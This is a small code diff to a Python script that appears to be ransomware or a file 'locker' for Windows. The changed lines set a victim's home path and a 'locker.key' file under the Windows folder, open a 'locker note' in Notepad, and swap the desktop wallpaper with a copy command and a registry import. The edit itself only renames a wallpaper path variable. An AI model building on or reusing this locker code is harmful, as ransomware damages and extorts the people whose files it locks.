@@ -25,7 +25,7 @@ fileList = []
 user = sys.argv[1] # Replace this if you want to hardcode
 systemdrive = os.environ['SYSTEMDRIVE']
 homepath = systemdrive + "\\Users\\" + user
-wallpaper = systemdrive + "\\Windows\\wallpaper.jpg"
+wallpaperlocation = systemdrive + "\\Windows\\"
 keyfile = systemdrive + "\\Windows\\locker.key"
 #print(homepath)
 
@@ -110,7 +110,7 @@ def GenLockerNote(path):
     os.system("notepad.exe " + path)
 
 def SetWallpaper(filename):
-    os.system("copy " + filename + " " + wallpaper)
+    os.system("copy " + filename + " " + wallpaperlocation)
     time.sleep(1)
     os.system("reg import wallpaper.reg")
     time.sleep(1)
